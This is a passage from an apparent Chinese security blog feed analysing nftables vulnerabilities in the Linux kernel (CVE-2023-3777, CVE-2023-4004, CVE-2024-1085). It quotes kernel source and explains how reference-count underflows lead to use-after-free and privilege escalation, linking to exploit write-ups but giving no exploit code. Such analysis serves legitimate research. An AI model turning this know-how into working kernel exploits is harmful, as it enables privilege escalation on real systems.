class="comment"> * alignment check (and can we make it work with acceptable performance</span></span><br><span class="line"><span class="comment"> * cost compared to the security improvement - probably not)?</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * NULL freepointer must be special-cased.</span></span><br><span class="line"><span class="comment"> * Write it in a way that gives the compiler a chance to avoid adding</span></span><br><span class="line"><span class="comment"> * an unpredictable branch.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">slab_base = decoded ? slab_base : <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (CHECK_DATA_CORRUPTION(</span><br><span class="line">((<span class="keyword">unsigned</span> <span class="keyword">long</span>)decoded &amp; slab-&gt;align_mask) != slab_base,</span><br><span class="line"><span class="string">&quot;bad freeptr (encoded %lx, ptr %px, base %lx, mask %lx&quot;</span>,</span><br><span class="line">ptr.v, decoded, slab_base, slab-&gt;align_mask))</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">return</span> decoded;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="keyword">return</span> (<span class="keyword">void</span>*)ptr.v;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里会检测地址是否在slab_base中，但是我在elixir.bootlin.com中切换了很多版本，死活找不到这段代码，不过这里有没有这段代码其实影响不大，因为原作者在这里使用了错位的堆块来利用（感觉是不必要的），所以是需要考虑一下这个对齐是否会引起panic，不过这里使用的是<code>CHECK_DATA_CORRUPTION</code>也只是会引起警告，并且如果不是对齐的堆地址只会返回NULL故在后面的利用结束后虽然freelist的内容依旧损坏但是依旧不会出现kernel panic。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> *<span class="title">freelist_ptr</span><span class="params">(<span class="keyword">const</span> struct kmem_cache *s, <span class="keyword">void</span> *ptr,</span></span></span><br><span class="line"><span class="params"><span class="function"> <span class="keyword">unsigned</span> <span class="keyword">long</span> ptr_addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * When CONFIG_KASAN_SW/HW_TAGS is enabled, ptr_addr might be tagged.</span></span><br><span class="line"><span class="comment"> * Normally, this doesn&#x27;t cause any issues, as both set_freepointer()</span></span><br><span class="line"><span class="comment"> * and get_freepointer() are called with a pointer with the same tag.</span></span><br><span class="line"><span class="comment"> * However, there are some issues with CONFIG_SLUB_DEBUG code. For</span></span><br><span class="line"><span class="comment"> * example, when __free_slub() iterates over objects in a cache, it</span></span><br><span class="line"><span class="comment"> * passes untagged pointers to check_object(). check_object() in turns</span></span><br><span class="line"><span class="comment"> * calls get_freepointer() with an untagged pointer, which causes the</span></span><br><span class="line"><span class="comment"> * freepointer to be restored incorrectly.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">return</span> (<span class="keyword">void</span> *)((<span class="keyword">unsigned</span> <span class="keyword">long</span>)ptr ^ s-&gt;random ^</span><br><span class="line">swab((<span class="keyword">unsigned</span> <span class="keyword">long</span>)kasan_reset_tag((<span class="keyword">void</span> *)ptr_addr)));</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="keyword">return</span> ptr;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不过在我看到的内容里是没有上面那些代码的，所以在利用结束后freelist被破坏的数据被申请时就极有可能出现kernel panic的问题，不过这里我能想到的解决办法就是开始申请一部分会污染掉freelist对应大小的堆块，最后放入其中避免出现panic。</p><p>这个CVE的具体利用方法可以参考<a href="https://196082.github.io/2022/09/20/CVE-2021-22555%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E5%88%86%E6%9E%90/">CVE-2021-22555利用方法分析</a>文章，利用方式基本一致（并且我觉得错位堆块是无意义的，当然可能是我没有理解到原作者使用此方式的背后含意）。</p><h2 id="CVE-2023-3777"><a href="#CVE-2023-3777" class="headerlink" title="CVE-2023-3777"></a>CVE-2023-3777</h2><h3 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>该漏洞类似于上一篇中的CVE-2023-4015漏洞。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">nf_tables_delrule</span><span class="params">(struct sk_buff *skb, <span class="keyword">const</span> struct nfnl_info *info,</span></span></span><br><span class="line"><span class="params"><span class="function">     <span class="keyword">const</span> struct nlattr * <span class="keyword">const</span> nla[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">netlink_ext_ack</span> *<span class="title">extack</span> =</span> info-&gt;extack;</span><br><span class="line">u8 genmask = nft_genmask_next(info-&gt;net);</span><br><span class="line">u8 family = info-&gt;nfmsg-&gt;nfgen_family;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_chain</span> *<span class="title">chain</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">net</span> *<span class="title">net</span> =</span> info-&gt;net;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_table</span> *<span class="title">table</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_rule</span> *<span class="title">rule</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_ctx</span> <span class="title">ctx</span>;</span></span><br><span class="line"><span class="keyword">int</span> err = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">table = nft_table_lookup(net, nla[NFTA_RULE_TABLE], family, genmask,</span><br><span class="line"> NETLINK_CB(skb).portid);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(table)) &#123;</span><br><span class="line">NL_SET_BAD_ATTR(extack, nla[NFTA_RULE_TABLE]);</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(table);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_RULE_CHAIN]) &#123;</span><br><span class="line">chain = nft_chain_lookup(net, table, nla[NFTA_RULE_CHAIN],</span><br><span class="line"> genmask);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(chain)) &#123;</span><br><span class="line"><span class="keyword">if</span> (PTR_ERR(chain) == -ENOENT &amp;&amp;</span><br><span class="line">    NFNL_MSG_TYPE(info-&gt;nlh-&gt;nlmsg_type) == NFT_MSG_DESTROYRULE)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">NL_SET_BAD_ATTR(extack, nla[NFTA_RULE_CHAIN]);</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(chain);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (nft_chain_is_bound(chain))</span><br><span class="line"><span class="keyword">return</span> -EOPNOTSUPP;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">nft_ctx_init(&amp;ctx, net, skb, info-&gt;nlh, family, table, chain, nla);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (chain) &#123;</span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_RULE_HANDLE]) &#123;</span><br><span class="line">rule = nft_rule_lookup(chain, nla[NFTA_RULE_HANDLE]);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(rule)) &#123;</span><br><span class="line"><span class="keyword">if</span> (PTR_ERR(rule) == -ENOENT &amp;&amp;</span><br><span class="line">    NFNL_MSG_TYPE(info-&gt;nlh-&gt;nlmsg_type) == NFT_MSG_DESTROYRULE)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">NL_SET_BAD_ATTR(extack, nla[NFTA_RULE_HANDLE]);</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(rule);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">err = nft_delrule(&amp;ctx, rule);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (nla[NFTA_RULE_ID]) &#123;</span><br><span class="line">rule = nft_rule_lookup_byid(net, chain, nla[NFTA_RULE_ID]);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(rule)) &#123;</span><br><span class="line">NL_SET_BAD_ATTR(extack, nla[NFTA_RULE_ID]);</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(rule);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">err = nft_delrule(&amp;ctx, rule);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">err = nft_delrule_by_chain(&amp;ctx);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">list_for_each_entry(chain, &amp;table-&gt;chains, <span class="built_in">list</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (!nft_is_active_next(net, chain))</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">ctx.chain = chain;</span><br><span class="line">err = nft_delrule_by_chain(&amp;ctx);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该漏洞发生于<code>nf_tables_delrule</code>函数中，可以看到在给定chain时，会在最后对chain是否绑定做检测，但是在没有给定chain时会直接遍历chain删除所有rule。</p><p>删除rule的流程就不过多介绍了，前面已经分析过很多次了，所以很容易想到这里会出现use成员下溢的现象最终转化为uaf。</p><hr><p>参考链接：</p><p><a class="link"   href="https://github.com/google/security-research/blob/master/pocs/linux/kernelctf/CVE-2024-1085_lts/docs/exploit.md" >https://github.com/google/security-research/blob/master/pocs/linux/kernelctf/CVE-2024-1085_lts/docs/exploit.md<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="https://starlabs.sg/blog/2023/09-nftables-adventures-bug-hunting-and-n-day-exploitation/#cve-2023-31248" >https://starlabs.sg/blog/2023/09-nftables-adventures-bug-hunting-and-n-day-exploitation/#cve-2023-31248<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="https://github.com/google/security-research/blob/master/pocs/linux/kernelctf/CVE-2023-3390_lts_cos_mitigation/docs/exploit.md" >https://github.com/google/security-research/blob/master/pocs/linux/kernelctf/CVE-2023-3390_lts_cos_mitigation/docs/exploit.md<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="https://github.com/google/security-research/blob/master/pocs/linux/kernelctf/CVE-2023-3777_lts/docs/exploit.md" >https://github.com/google/security-research/blob/master/pocs/linux/kernelctf/CVE-2023-3777_lts/docs/exploit.md<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;学二进制的第一步就是斩断情丝！&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img   src=&quot;/images/1028055096</summary>
      
    
    
    
    <category term="Linux Kernel" scheme="https://196082.github.io/categories/Linux-Kernel/"/>
    
    <category term="CVE复现" scheme="https://196082.github.io/categories/Linux-Kernel/CVE%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="Race condition" scheme="https://196082.github.io/tags/Race-condition/"/>
    
    <category term="genmask" scheme="https://196082.github.io/tags/genmask/"/>
    
    <category term="Integer Overflow" scheme="https://196082.github.io/tags/Integer-Overflow/"/>
    
  </entry>
  
  <entry>
    <title>nftables CVE复现系列【一】</title>
    <link href="https://196082.github.io/2024/09/03/nftables-CVEs1/"/>
    <id>https://196082.github.io/2024/09/03/nftables-CVEs1/</id>
    <published>2024-09-03T07:24:32.000Z</published>
    <updated>2024-09-03T10:44:39.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>CVE复现还是要趁热复现，不要因为其他事耽误了TvT，毕竟挖洞是重中之重特别是对现在的我来说，一个洞都没有TvT。</p><p>不知道算是运气好还是运气不好，在复现CVE-2023-4004的时候发现了另外一个漏洞，在一通分析之后欣喜若狂发现确实可以用来提权，但是在想搞明白这一行为的时候搜索发现已经有了CVE了也就是CVE-2024-1085，那这个CVE的复现就放在后面一篇文章吧。</p><p>在这个CVE复现系列就不会再写exp，如果不是特别新颖的利用方式也不会过多介绍了，这里主要分析漏洞成因以及梳理系统逻辑。</p><p>本来打算复现三个CVE无奈篇幅过长，漏洞的细节挺多的，所以只能容纳两篇。</p><h2 id="CVE-2023-4004"><a href="#CVE-2023-4004" class="headerlink" title="CVE-2023-4004"></a>CVE-2023-4004</h2><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p>在想要彻底搞明白这个漏洞之前可能还需要补齐一点前两篇文章缺少的一些前置知识。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_set</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span><span class="title">list</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span><span class="title">bindings</span>;</span></span><br><span class="line"><span class="keyword">refcount_t</span>refs;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_table</span>*<span class="title">table</span>;</span></span><br><span class="line"><span class="keyword">possible_net_t</span>net;</span><br><span class="line"><span class="keyword">char</span>*name;</span><br><span class="line">u64handle;</span><br><span class="line">u32ktype;</span><br><span class="line">u32dtype;</span><br><span class="line">u32objtype;</span><br><span class="line">u32size;</span><br><span class="line">u8field_len[NFT_REG32_COUNT];</span><br><span class="line">u8field_count;</span><br><span class="line">u32use;</span><br><span class="line"><span class="keyword">atomic_t</span>nelems;</span><br><span class="line">u32ndeact;</span><br><span class="line">u64timeout;</span><br><span class="line">u32gc_int;</span><br><span class="line">u16policy;</span><br><span class="line">u16udlen;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>*udata;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span><span class="title">pending_update</span>;</span></span><br><span class="line"><span class="comment">/* runtime data below here */</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nft_set_ops</span>*<span class="title">ops</span> ____<span class="title">cacheline_aligned</span>;</span></span><br><span class="line">u16flags:<span class="number">13</span>,</span><br><span class="line">dead:<span class="number">1</span>,</span><br><span class="line">genmask:<span class="number">2</span>;</span><br><span class="line">u8klen;</span><br><span class="line">u8dlen;</span><br><span class="line">u8num_exprs;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_expr</span>*<span class="title">exprs</span>[<span class="title">NFT_SET_EXPR_MAX</span>];</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span><span class="title">catchall_list</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>data[]</span><br><span class="line">__attribute__((aligned(__alignof__(u64))));</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>首先上面是set集合的结构体定义。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">nf_tables_newset</span><span class="params">(struct net *net, struct sock *nlsk,</span></span></span><br><span class="line"><span class="params"><span class="function">    struct sk_buff *skb, <span class="keyword">const</span> struct nlmsghdr *nlh,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">const</span> struct nlattr * <span class="keyword">const</span> nla[],</span></span></span><br><span class="line"><span class="params"><span class="function">    struct netlink_ext_ack *extack)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// ......</span></span><br><span class="line">    <span class="keyword">if</span> (nla[NFTA_SET_DESC] != <span class="literal">NULL</span>) &#123;</span><br><span class="line">err = nf_tables_set_desc_parse(&amp;desc, nla[NFTA_SET_DESC]);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (desc.field_count &gt; <span class="number">1</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (!(flags &amp; NFT_SET_CONCAT))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (flags &amp; NFT_SET_CONCAT) &#123;</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (flags &amp; NFT_SET_CONCAT) &#123;</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">// ......</span></span><br><span class="line"><span class="built_in">set</span>-&gt;field_count = desc.field_count;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; desc.field_count; i++)</span><br><span class="line"><span class="built_in">set</span>-&gt;field_len[i] = desc.field_len[i];</span><br><span class="line">    </span><br><span class="line">    err = ops-&gt;init(<span class="built_in">set</span>, &amp;desc, nla);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> err_set_init;</span><br><span class="line">    <span class="comment">// ......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在后面关于element的inert时会遇到set中的成员<code>field_count</code>和<code>field_len</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">nf_tables_set_desc_parse</span><span class="params">(struct nft_set_desc *desc,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">const</span> struct nlattr *nla)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">da</span>[<span class="title">NFTA_SET_DESC_MAX</span> + 1];</span></span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">err = nla_parse_nested_deprecated(da, NFTA_SET_DESC_MAX, nla,</span><br><span class="line">  nft_set_desc_policy, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (da[NFTA_SET_DESC_SIZE] != <span class="literal">NULL</span>)</span><br><span class="line">desc-&gt;size = ntohl(nla_get_be32(da[NFTA_SET_DESC_SIZE]));</span><br><span class="line"><span class="keyword">if</span> (da[NFTA_SET_DESC_CONCAT])</span><br><span class="line">err = nft_set_desc_concat(desc, da[NFTA_SET_DESC_CONCAT]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>前面通过<code>nla_parse_nested_deprecated</code>将nla解析到da中，并执行<code>nft_set_desc_concat</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">nft_set_desc_concat_parse</span><span class="params">(<span class="keyword">const</span> struct nlattr *attr,</span></span></span><br><span class="line"><span class="params"><span class="function">     struct nft_set_desc *desc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">tb</span>[<span class="title">NFTA_SET_FIELD_MAX</span> + 1];</span></span><br><span class="line">u32 len;</span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (desc-&gt;field_count &gt;= ARRAY_SIZE(desc-&gt;field_len))</span><br><span class="line"><span class="keyword">return</span> -E2BIG;</span><br><span class="line"></span><br><span class="line">err = nla_parse_nested_deprecated(tb, NFTA_SET_FIELD_MAX, attr,</span><br><span class="line">  nft_concat_policy, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!tb[NFTA_SET_FIELD_LEN])</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">len = ntohl(nla_get_be32(tb[NFTA_SET_FIELD_LEN]));</span><br><span class="line"><span class="keyword">if</span> (!len || len &gt; U8_MAX)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">desc-&gt;field_len[desc-&gt;field_count++] = len;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">nft_set_desc_concat</span><span class="params">(struct nft_set_desc *desc,</span></span></span><br><span class="line"><span class="params"><span class="function">       <span class="keyword">const</span> struct nlattr *nla)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">attr</span>;</span></span><br><span class="line">u32 num_regs = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> rem, err, i;</span><br><span class="line"></span><br><span class="line">nla_for_each_nested(attr, nla, rem) &#123;</span><br><span class="line"><span class="keyword">if</span> (nla_type(attr) != NFTA_LIST_ELEM)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">err = nft_set_desc_concat_parse(attr, desc);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; desc-&gt;field_count; i++)</span><br><span class="line">num_regs += DIV_ROUND_UP(desc-&gt;field_len[i], <span class="keyword">sizeof</span>(u32));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (num_regs &gt; NFT_REG32_COUNT)</span><br><span class="line"><span class="keyword">return</span> -E2BIG;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到的是这里的<code>desc-&gt;field_count</code>是根据循环次数来决定的，那么先分析一下能够循环多少次</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span 